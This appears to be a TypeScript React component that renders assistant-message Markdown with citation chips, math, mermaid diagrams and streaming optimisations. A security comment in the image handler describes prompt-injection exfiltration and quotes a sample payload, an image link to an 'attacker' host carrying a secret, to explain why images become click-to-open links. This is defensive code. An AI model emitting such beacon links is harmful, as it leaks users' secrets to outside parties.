import { BASE_URL } from "@/api/client";
import { EvidenceBadge } from "@/components/EvidenceBadge";
import { MermaidDiagram } from "@/components/MermaidDiagram";
import { remarkCitations } from "@/components/remarkCitations";
import { remarkEvidence } from "@/components/remarkEvidence";
import { splitMarkdownBlocks } from "@/components/streamingMarkdown";
// Assistant-message Markdown for the mobile client (前端技术与架构 §七 · 富渲染).
//
// Full stack (matches desktop coverage, minimal-deps variant): react-markdown +
// remark-gfm + remark-math & rehype-katex + rehype-highlight (deferred while streaming)
// + lazy mermaid (```mermaid → diagram; source-only while streaming) + inline `[n]` /
// `#rN` citation chips with optional `citationToDisplay` map (no Popover — clickable
// external link + stable display number). Streaming splits into memoized top-level
// blocks so finished chunks skip re-parse on each delta.
//
// Pure rendering leaf (no protocol fold). No import from apps/desktop.
import type {
  Citation,
  EvidenceLedgerEntry,
  TurnEvidenceLedgerEntry,
} from "@agentcore/contract-types";
import {
  type ComponentPropsWithoutRef,
  type ReactNode,
  memo,
  useMemo,
  useState,
} from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import rehypeKatex from "rehype-katex";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import "katex/dist/katex.min.css";
import "@/components/markdown.css";

type ReactMarkdownProps = ComponentPropsWithoutRef<typeof ReactMarkdown>;

// Stable module-level plugin refs so ReactMarkdown doesn't re-init on every delta.
const remarkBase = [remarkGfm, remarkMath];
const rehypeHighlighted: ReactMarkdownProps["rehypePlugins"] = [
  rehypeKatex,
  [rehypeHighlight, { ignoreMissing: true }],
];
// While streaming: drop rehype-highlight — re-tokenizing every code block on each
// delta is the dominant cost. Plain monospace until the turn finishes.
const rehypeStreaming: ReactMarkdownProps["rehypePlugins"] = [rehypeKatex];

type LedgerLike = TurnEvidenceLedgerEntry | EvidenceLedgerEntry;

function ledgerEntryAsCitation(entry: LedgerLike): Citation | null {
  const url = (entry.url ?? "").trim();
  if (!url) return null;
  const turn = entry as TurnEvidenceLedgerEntry;
  return {
    url,
    title: entry.title ?? "",
    snippet: entry.snippet ?? "",
    site: entry.site ?? "",
    id: entry.id,
    date: entry.date,
    tier: entry.tier,
    query: turn.query,
    deep_read: turn.deep_read,
    registrant: turn.registrant,
    citable: turn.citable,
  };
}

/**
 * Resolve a `#rN` chip target: prefer ``citations[].id``, else evidence ledger.
 * Returns pool index + display fallback so chips align with an optional display map.
 */
function resolveLedgerCitation(
  ledgerId: string,
  citations: Citation[],
  evidenceLedger: readonly LedgerLike[] | null | undefined,
): { citation: Citation; poolIndex: number; displayFallback: number } | null {
  const byId = citations.findIndex((c) => c.id === ledgerId);
  if (byId >= 0) {
    const citation = citations[byId];
    if (citation?.url) {
      return { citation, poolIndex: byId, displayFallback: byId + 1 };
    }
  }
  const entry = evidenceLedger?.find((e) => e.id === ledgerId);
  if (!entry) return null;
  const asCite = ledgerEntryAsCitation(entry);
  if (!asCite) return null;
  const byUrl = citations.findIndex((c) => c.url === asCite.url);
  const matchedByUrl = byUrl >= 0 ? citations[byUrl] : undefined;
  if (matchedByUrl) {
    return {
      citation: matchedByUrl,
      poolIndex: byUrl,
      displayFallback: byUrl + 1,
    };
  }
  const n = Number(/^#r(\d+)$/.exec(ledgerId)?.[1]);
  return {
    citation: asCite,
    poolIndex: -1,
    displayFallback: Number.isFinite(n) && n > 0 ? n : 1,
  };
}

/**
 * Tiny inline favicon. Failed / missing icon falls back to the same site letter
 * used on SourceCards, so body chips and the source row stay aligned.
 */
function ChipFavicon({ site, title }: { site?: string; title?: string }) {
  const domain = site?.trim();
  const [failedDomain, setFailedDomain] = useState<string | null>(null);
  const letter = (domain || title || "?").charAt(0).toUpperCase();
  const showImg = !!domain && failedDomain !== domain;
  return (
    <span className="cite-chip-favicon" aria-hidden>
      {showImg ? (
        <img
          src={`${BASE_URL}/v1/favicon?domain=${encodeURIComponent(domain)}`}
          alt=""
          loading="lazy"
          onError={() => setFailedDomain(domain)}
        />
      ) : (
        letter
      )}
    </span>
  );
}

/**
 * Inline citation chip: muted favicon+number pill linked to the source URL
 * (no Popover — mobile simplifies to tappable external link).
 */
function CitationChip({
  "data-n": dataN,
  "data-ledger-id": dataLedgerId,
  citations,
  evidenceLedger,
  toDisplay,
}: {
  "data-n"?: string;
  "data-ledger-id"?: string;
  children?: ReactNode;
  citations: Citation[];
  evidenceLedger?: readonly LedgerLike[] | null;
  toDisplay: ReadonlyMap<number, number>;
}) {
  if (dataLedgerId) {
    const hit = resolveLedgerCitation(dataLedgerId, citations, evidenceLedger);
    if (!hit) return <>{dataLedgerId}</>;
    const { citation, poolIndex, displayFallback } = hit;
    const display =
      poolIndex >= 0
        ? (toDisplay.get(poolIndex + 1) ?? displayFallback)
        : displayFallback;
    return (
      <a
        className="cite-chip"
        href={citation.url}
        target="_blank"
        rel="noreferrer"
        title={citation.title || citation.url}
        aria-label={`来源 ${display}（${dataLedgerId}）`}
      >
        <ChipFavicon site={citation.site} title={citation.title} />
        {display}
      </a>
    );
  }

  const canonical = Number(dataN);
  if (!Number.isFinite(canonical) || canonical < 1) {
    return <>{dataN != null ? `[${dataN}]` : null}</>;
  }
  const citation = citations[canonical - 1];
  const display = toDisplay.get(canonical);
  if (!citation?.url || display == null) {
    return <>{`[${canonical}]`}</>;
  }
  return (
    <a
      className="cite-chip"
      href={citation.url}
      target="_blank"
      rel="noreferrer"
      title={citation.title || citation.url}
      aria-label={`来源 ${display}`}
    >
      <ChipFavicon site={citation.site} title={citation.title} />
      {display}
    </a>
  );
}

/** One memoized Markdown chunk — finished blocks skip re-parse across streaming deltas. */
const MarkdownChunk = memo(function MarkdownChunk({
  content,
  remarkPlugins: remarks,
  rehypePlugins: rehype,
  components,
}: {
  content: string;
  remarkPlugins: ReactMarkdownProps["remarkPlugins"];
  rehypePlugins: ReactMarkdownProps["rehypePlugins"];
  components: Components;
}) {
  return (
    <ReactMarkdown
      remarkPlugins={remarks}
      rehypePlugins={rehype}
      components={components}
    >
      {content}
    </ReactMarkdown>
  );
});

interface Props {
  content: string;
  /** Web sources; enables `[n]` citation chips linking to each source. */
  citations?: Citation[];
  /**
   * Canonical (1-based) → display number map (shared with source cards when parent
   * builds one). When omitted, chips fall back to identity (pool index).
   */
  citationToDisplay?: ReadonlyMap<number, number>;
  /** While true: split into memoized blocks, defer highlight + mermaid render. */
  isStreaming?: boolean;
  /** Quieter tone for secondary content (e.g. reasoning). */
  muted?: boolean;
  /** Debate speech only: render evidence-status markers as {@link EvidenceBadge}. */
  evidence?: boolean;
  /** Known turn-ledger ids (`#rN`); when omitted, derived from ledger + citations. */
  knownLedgerIds?: ReadonlySet<string> | null;
  /** Turn research ledger — `#rN` URL fallback when citations lag or omit id. */
  evidenceLedger?:
    | readonly TurnEvidenceLedgerEntry[]
    | readonly EvidenceLedgerEntry[]
    | null;
}

/**
 * Assistant-message Markdown: GFM, KaTeX, deferred highlight while streaming,
 * mermaid (source-only mid-stream), and optional citation chips with display map.
 */
export const Markdown = memo(function Markdown({
  content,
  muted = false,
  citations,
  citationToDisplay,
  isStreaming = false,
  evidenceLedger = null,
  evidence = false,
  knownLedgerIds = null,
}: Props) {
  const citationCount = citations?.length ?? 0;
  const resolvedLedgerIds = useMemo(() => {
    if (knownLedgerIds && knownLedgerIds.size > 0) return knownLedgerIds;
    const ids = new Set<string>();
    for (const e of evidenceLedger ?? []) {
      if (e.id) ids.add(e.id);
    }
    for (const c of citations ?? []) {
      if (c.id) ids.add(c.id);
    }
    return ids.size > 0 ? ids : null;
  }, [knownLedgerIds, evidenceLedger, citations]);
  const ledgerIdCount = resolvedLedgerIds?.size ?? 0;

  const toDisplay = useMemo(() => {
    if (citationToDisplay) return citationToDisplay;
    const m = new Map<number, number>();
    for (let i = 1; i <= citationCount; i++) m.set(i, i);
    return m;
  }, [citationToDisplay, citationCount]);

  const remarks = useMemo(() => {
    if (citationCount <= 0 && ledgerIdCount <= 0 && !evidence) {
      return remarkBase;
    }
    return [
      ...remarkBase,
      ...(citationCount > 0 || ledgerIdCount > 0
        ? [remarkCitations(citationCount, resolvedLedgerIds)]
        : []),
      ...(evidence ? [remarkEvidence()] : []),
    ];
  }, [citationCount, ledgerIdCount, resolvedLedgerIds, evidence]);

  const components = useMemo<Components>(() => {
    const pool = citations ?? [];
    const base: Components = {
      a({ href, children, ...props }) {
        return (
          <a href={href} target="_blank" rel="noreferrer" {...props}>
            {children}
          </a>
        );
      },
      img({ src, alt }) {
        // SECURITY (PI-001 提示注入·渲染侧外泄): downgrade every model-emitted markdown
        // image to a click-to-open link — never an auto-loading <img>. No rehype-raw is
        // loaded, so `![](url)` is the only image path; without this an injected
        // `![](http://attacker/?d=<secret>)` would fetch on render = a silent, no-click
        // exfil beacon. As a link, egress needs an explicit user click.
        const href = typeof src === "string" ? src : undefined;
        const label =
          typeof alt === "string" && alt.trim() ? alt.trim() : "图片链接";
        if (!href) return <>{label}</>;
        return (
          <a href={href} target="_blank" rel="noreferrer">
            {label}
          </a>
        );
      },
      code({ className, children, ...props }) {
        const lang = /language-(\w+)/.exec(className || "")?.[1];
        if (lang === "mermaid") {
          const chart = String(children).replace(/\n$/, "");
          // Half-written diagram is a syntax error — show source until the turn finishes.
          if (isStreaming) {
            return (
              <code className={className} {...props}>
                {children}
              </code>
            );
          }
          return <MermaidDiagram chart={chart} />;
        }
        return (
          <code className={className} {...props}>
            {children}
          </code>
        );
      },
    };
    if (citationCount > 0 || ledgerIdCount > 0) {
      const CiteMark = (props: {
        "data-n"?: string;
        "data-ledger-id"?: string;
        children?: ReactNode;
      }) => (
        <CitationChip
          data-n={props["data-n"]}
          data-ledger-id={props["data-ledger-id"]}
          citations={pool}
          evidenceLedger={evidenceLedger}
          toDisplay={toDisplay}
        >
          {props.children}
        </CitationChip>
      );
      (base as Record<string, unknown>).citemark = CiteMark;
    }
    // 举证徽章：remarkEvidence → evidencemark。仅辩论发言 opt-in。
    if (evidence) {
      (base as Record<string, unknown>).evidencemark = EvidenceBadge;
    }
    return base;
  }, [
    citations,
    evidenceLedger,
    citationCount,
    ledgerIdCount,
    evidence,
    toDisplay,
    isStreaming,
  ]);

  const rehype = isStreaming ? rehypeStreaming : rehypeHighlighted;
  const blocks = isStreaming ? splitMarkdownBlocks(content) : null;

  return (
    <div className={`md${muted ? " md-muted" : ""}`}>
      {blocks ? (
        blocks.map((block, i) => (
          <MarkdownChunk
            // Streaming blocks are append-only: index is the stable identity.
            // biome-ignore lint/suspicious/noArrayIndexKey: append-only streaming blocks
            key={i}
            content={block}
            remarkPlugins={remarks}
            rehypePlugins={rehype}
            components={components}
          />
        ))
      ) : (
        <MarkdownChunk
          content={content}
          remarkPlugins={remarks}
          rehypePlugins={rehype}
          components={components}
        />
      )}
    </div>
  );
});
